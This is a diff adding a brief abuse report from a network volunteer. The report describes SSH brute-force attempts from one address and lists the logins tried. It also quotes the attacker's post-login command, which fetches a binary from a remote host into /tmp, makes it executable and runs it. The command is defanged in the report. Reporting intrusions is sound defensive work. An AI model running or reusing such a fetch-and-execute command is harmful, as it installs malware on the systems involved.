@@ -1,0 +1,16 @@
+Hello,
+
+The address below attacked a monitored system.
+Times are UTC. Source ports are included.
+
+198.51.100.23 (AS64500, EXAMPLE-NET)
+  2026-10-30T14:02:11Z to 2026-10-30T15:40:02Z, TCP/22 (ssh)
+  - Login attempts: 412 (users: root, admin, ubnt)
+  - 2026-10-30T15:39:58Z Commands:
+      cd /tmp; wget hxxp://203.0.113[.]9/bins/x86; chmod +x x86; ./x86
+
+Please look into it.
+
+Contact: reports@example.org
+
+Regards, a network volunteer
